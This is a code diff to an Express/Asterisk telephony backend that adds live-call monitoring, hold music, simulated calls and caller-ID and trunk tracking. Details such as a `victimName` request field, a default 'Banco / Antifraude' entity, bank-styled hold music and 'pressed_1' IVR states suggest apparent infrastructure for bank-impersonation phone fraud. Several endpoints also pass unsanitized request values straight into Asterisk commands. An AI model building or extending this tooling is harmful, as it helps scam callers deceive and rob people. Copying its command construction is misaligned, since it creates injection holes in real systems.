@@ -144,10 +144,21 @@ function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret =
 export interface CallState {
   number: string;
   channel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'pressed_1' | 'machine' | 'ended' | 'transferred';
+  bridgedChannel?: string;
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'talking' | 'on_hold' | 'pressed_1' | 'machine' | 'ended' | 'transferred';
   digit?: string;
   cause?: string;
   agent?: string;
+  agentName?: string;
+  clientName?: string;
+  entityName?: string;
+  entityId?: string;
+  holdMusic?: string;
+  holdMusicName?: string;
+  trunk?: string;
+  callerId?: string;
+  isOnHold?: boolean;
+  holdStartedAt?: number;
   timestamp: number;
   startTime?: number;
   answeredAt?: number;
@@ -156,6 +167,42 @@ export interface CallState {
 }
 
 const callStatusStore = new Map<string, CallState>();
+
+// Helper to ensure /etc/asterisk/musiconhold.conf exists for reliable Music on Hold
+function ensureMusiconholdConfExists() {
+  const mohPath = '/etc/asterisk/musiconhold.conf';
+  const mohContent = `; ========================================================
+; Asterisk Music on Hold Configuration (MOH)
+; Clases de musica en espera personalizadas por entidad
+; ========================================================
+[general]
+
+[default]
+mode=files
+directory=/var/lib/asterisk/sounds/custom
+sort=alpha
+
+[moh_bank]
+mode=files
+directory=/var/lib/asterisk/sounds/custom
+sort=alpha
+
+[moh_corporate]
+mode=files
+directory=/var/lib/asterisk/sounds/custom
+sort=alpha
+
+[moh_digital]
+mode=files
+directory=/var/lib/asterisk/sounds/custom
+sort=alpha
+`;
+  try {
+    if (!fs.existsSync(mohPath)) {
+      writeAsteriskConfigFile(mohPath, mohContent);
+    }
+  } catch (_) {}
+}
 
 // Helper to ensure /etc/asterisk/amd.conf exists for reliable Answering Machine Detection
 function ensureAmdConfExists() {
@@ -471,6 +518,10 @@ function ensureCustomAudioFilesExist() {
     { name: 'intentos_superados', text: 'Ha superado el numero maximo de intentos permitidos. La llamada finalizara.', freq: 440 },
     { name: 'gracias_hasta_luego', text: 'Gracias por comunicarse con nosotros. Hasta luego.', freq: 520 },
     { name: 'mi_audio', text: 'Bienvenido al servicio de atencion al cliente.', freq: 520 },
+    { name: 'moh_corporate_loop', text: '', freq: 440 },
+    { name: 'moh_banco_elegante', text: '', freq: 523 },
+    { name: 'moh_digital_hold', text: '', freq: 659 },
+    { name: 'moh_jazz_telecom', text: '', freq: 392 },
   ];
 
   for (const aud of audios) {
@@ -2935,7 +2986,18 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       number: cleanDest,
       channel,
       status: 'dialing',
+      agent: agentExten || '1001',
+      agentName: agentExten === '1001' ? 'Operador Principal' : `Agente ${agentExten}`,
+      clientName: req.body.victimName || req.body.clientName || 'Cliente',
+      entityName: service || 'Banco / Antifraude',
+      entityId: req.body.entityId || 'bank',
+      holdMusic: req.body.holdMusic || 'custom/moh_banco_elegante',
+      holdMusicName: path.basename(req.body.holdMusic || 'moh_banco_elegante'),
+      trunk: carrier || 'televox',
+      callerId: effectiveCidNum,
+      startTime: Date.now(),
       timestamp: Date.now(),
+      duration: 0,
     };
     callStatusStore.set(cleanDest, initialCallState);
     callStatusStore.set(formattedDest, initialCallState);
@@ -4704,6 +4766,257 @@ app.all('/api/asterisk/call/status/update', (req, res) => {
     );
   }
   res.json({ success: true });
+});
+
+// Endpoint to list live calls for LiveCallsTab monitoring in real-time
+app.get('/api/asterisk/live/calls', async (req, res) => {
+  try {
+    const list: any[] = [];
+    const now = Date.now();
+
+    // 1. Process from callStatusStore
+    for (const [key, call] of callStatusStore.entries()) {
+      // Avoid duplicate keys for same call (e.g. 10d vs 11d)
+      if (key.startsWith('1') && key.length === 11 && callStatusStore.has(key.substring(1))) {
+        continue;
+      }
+
+      const isAlive = call.status !== 'ended' && call.status !== 'machine';
+      // If ended more than 15 minutes ago, skip
+      if (!isAlive && (now - call.timestamp > 900000)) {
+        continue;
+      }
+
+      const answered = call.answeredAt || call.startTime || call.timestamp;
+      const liveDuration = isAlive && answered
+        ? Math.max(0, Math.floor((now - answered) / 1000))
+        : (call.duration || 0);
+
+      list.push({
+        id: call.number ? `call_${call.number}` : `call_${call.timestamp}`,
+        number: call.number,
+        clientName: call.clientName || 'Cliente',
+        agent: call.agent || '1001',
+        agentName: call.agentName || `Operador ${call.agent || '1001'}`,
+        status: call.isOnHold ? 'on_hold' : call.status,
+        statusText: call.isOnHold
+          ? 'En espera (Hold)'
+          : call.status === 'talking'
+          ? 'Hablando'
+          : call.status === 'transferred'
+          ? 'Conectado con Asesor'
+          : call.status === 'in_ivr'
+          ? 'En menú IVR'
+          : call.status === 'ringing'
+          ? 'Timbrando'
+          : call.status,
+        startTime: call.startTime || call.timestamp,
+        answeredAt: call.answeredAt,
+        duration: liveDuration,
+        entityId: call.entityId || 'bank',
+        entityName: call.entityName || 'Banco / Antifraude',
+        holdMusic: call.holdMusic || 'custom/moh_banco_elegante',
+        holdMusicName: call.holdMusicName || (call.holdMusic ? path.basename(call.holdMusic) : 'MOH Bancaria'),
+        channel: call.channel || '',
+        bridgedChannel: call.bridgedChannel || '',
+        trunk: call.trunk || 'televox',
+        digit: call.digit,
+        isOnHold: !!call.isOnHold,
+        holdStartedAt: call.holdStartedAt,
+        callerId: call.callerId,
+      });
+    }
+
+    // 2. Discover active channels from Asterisk if available
+    try {
+      let amiOutput = await executeAsteriskCommand('core show channels concise');
+      if (amiOutput) {
+        const lines = amiOutput.split('\n');
+        for (const line of lines) {
+          const trimmed = line.trim();
+          if (!trimmed || trimmed.startsWith('Output:') || trimmed.startsWith('Privilege:')) continue;
+          const parts = trimmed.split('!');
+          if (parts.length >= 7) {
+            const chanName = parts[0];
+            const callerIdNum = (parts[7] || '').replace(/[^0-9]/g, '');
+            const exten = parts[2] || '';
+            const app = parts[5] || '';
+            const durSec = parseInt(parts[10] || '0', 10);
+
+            // Check if we already have a record for this number or channel
+            const existing = list.find(
+              (c) => (callerIdNum && c.number.includes(callerIdNum)) || (chanName && c.channel === chanName)
+            );
+            if (!existing && (callerIdNum || exten)) {
+              const num = callerIdNum || exten;
+              list.push({
+                id: `chan_${chanName}`,
+                number: num,
+                clientName: 'Llamada Asterisk PJSIP',
+                agent: exten.length === 4 ? exten : '1001',
+                agentName: `Operador ${exten.length === 4 ? exten : '1001'}`,
+                status: app.toLowerCase().includes('musiconhold') ? 'on_hold' : 'talking',
+                statusText: 'Canal en curso',
+                startTime: now - durSec * 1000,
+                answeredAt: now - durSec * 1000,
+                duration: durSec,
+                entityId: 'bank',
+                entityName: 'Banco / Antifraude',
+                holdMusic: 'custom/moh_banco_elegante',
+                holdMusicName: 'MOH Bancaria',
+                channel: chanName,
+                trunk: 'televox',
+                isOnHold: app.toLowerCase().includes('musiconhold'),
+              });
+            }
+          }
+        }
+      }
+    } catch (_) {}
+
+    // Sort active calls first, then by duration desc
+    list.sort((a, b) => {
+      const aActive = a.status !== 'ended' ? 1 : 0;
+      const bActive = b.status !== 'ended' ? 1 : 0;
+      if (aActive !== bActive) return bActive - aActive;
+      return (b.duration || 0) - (a.duration || 0);
+    });
+
+    res.json({ success: true, calls: list });
+  } catch (err: any) {
+    res.status(500).json({ success: false, calls: [], error: err.message });
+  }
+});
+
+// Endpoint to toggle Hold (Music on Hold) for a live call
+app.post('/api/asterisk/call/hold', async (req, res) => {
+  try {
+    const { number, channel, hold = true, holdMusic = 'custom/moh_banco_elegante' } = req.body;
+    const cleanNum = String(number || '').trim().replace(/[^0-9]/g, '');
+
+    const updateState = (state: CallState) => {
+      state.isOnHold = !!hold;
+      state.status = hold ? 'on_hold' : 'talking';
+      state.holdStartedAt = hold ? Date.now() : undefined;
+      state.holdMusic = holdMusic;
+    };
+
+    if (cleanNum) {
+      const clean10 = cleanNum.length === 11 && cleanNum.startsWith('1') ? cleanNum.substring(1) : cleanNum;
+      const existing =
+        callStatusStore.get(cleanNum) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
+      if (existing) {
+        updateState(existing);
+      } else {
+        const newState: CallState = {
+          number: cleanNum,
+          channel: channel || '',
+          status: hold ? 'on_hold' : 'talking',
+          isOnHold: !!hold,
+          holdStartedAt: hold ? Date.now() : undefined,
+          holdMusic,
+          timestamp: Date.now(),
+          startTime: Date.now(),
+          duration: 0,
+        };
+        callStatusStore.set(cleanNum, newState);
+        callStatusStore.set(clean10, newState);
+      }
+      // Save state to AstDB
+      executeAsteriskCommand(`database put call_hold ${cleanNum} ${hold ? '1' : '0'}`).catch(() => {});
+      executeAsteriskCommand(`database put ivr_vars ${cleanNum}_hold_music "${holdMusic}"`).catch(() => {});
+    }
+
+    // Control Music On Hold in Asterisk via channel command if provided
+    if (channel) {
+      if (hold) {
+        executeAsteriskCommand(`moh start ${channel} default`).catch(() => {});
+      } else {
+        executeAsteriskCommand(`moh stop ${channel}`).catch(() => {});
+      }
+    }
+
+    console.log(`[CALL HOLD TOGGLE] Destino: ${cleanNum} -> En Hold: ${hold} (MOH: ${holdMusic})`);
+    res.json({ success: true, isOnHold: hold, holdMusic });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Endpoint to simulate an active live call for instant verification
+app.post('/api/asterisk/call/simulate', async (req, res) => {
+  try {
+    const {
+      number,
+      clientName = 'Cliente Simulado en Vivo',
+      agent = '1001',
+      agentName = 'Operador Asignado',
+      entityId = 'bank',
+      entityName = 'Banco / Antifraude',
+      holdMusic = 'custom/moh_banco_elegante',
+      trunk = 'televox',
+    } = req.body;
+
+    const cleanNum = String(number || '18095551234').replace(/[^0-9]/g, '');
+    const clean10 = cleanNum.length === 11 && cleanNum.startsWith('1') ? cleanNum.substring(1) : cleanNum;
+    const now = Date.now();
+
+    const call: CallState = {
+      number: cleanNum,
+      clientName,
+      agent,
+      agentName,
+      entityId,
+      entityName,
+      holdMusic,
+      holdMusicName: path.basename(holdMusic),
+      trunk,
+      status: 'talking',
+      isOnHold: false,
+      startTime: now,
+      answeredAt: now,
+      timestamp: now,
+      duration: 0,
+      channel: `PJSIP/${agent}-sim-${Math.random().toString(36).substring(2, 6)}`,
+    };
+
+    callStatusStore.set(cleanNum, call);
+    callStatusStore.set(clean10, call);
+    callStatusStore.set(`1${clean10}`, call);
+
+    // Save in AstDB
+    executeAsteriskCommand(`database put last_agent_call ${cleanNum} ${agent}`).catch(() => {});
+    executeAsteriskCommand(`database put ivr_vars ${cleanNum}_hold_music "${holdMusic}"`).catch(() => {});
+
+    console.log(`[SIMULATE CALL] Creada llamada de prueba para ${cleanNum} con agente ${agent} (${entityName})`);
+    res.json({ success: true, call });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Endpoint to synchronize Hold Music per entity into Asterisk
+app.post('/api/asterisk/audio/sync-hold-music', async (req, res) => {
+  try {
+    const { entityId, holdMusicPath } = req.body;
+    if (!entityId || !holdMusicPath) {
+      return res.status(400).json({ success: false, error: 'entityId y holdMusicPath son requeridos' });
+    }
+
+    const cleanPath = holdMusicPath.trim();
+    // Save to AstDB for this entity
+    await executeAsteriskCommand(`database put hold_music ${entityId} "${cleanPath}"`);
+    await executeAsteriskCommand(`database put ivr_vars default_hold_music "${cleanPath}"`);
+
+    // Ensure musiconhold.conf is ready and Asterisk reloads MOH
+    ensureMusiconholdConfExists();
+    executeAsteriskCommand('moh reload').catch(() => {});
+
+    console.log(`[SYNC HOLD MUSIC] Entidad "${entityId}" configurada con MOH: ${cleanPath}`);
+    res.json({ success: true, entityId, holdMusicPath: cleanPath });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 // Endpoint to hangup an active call
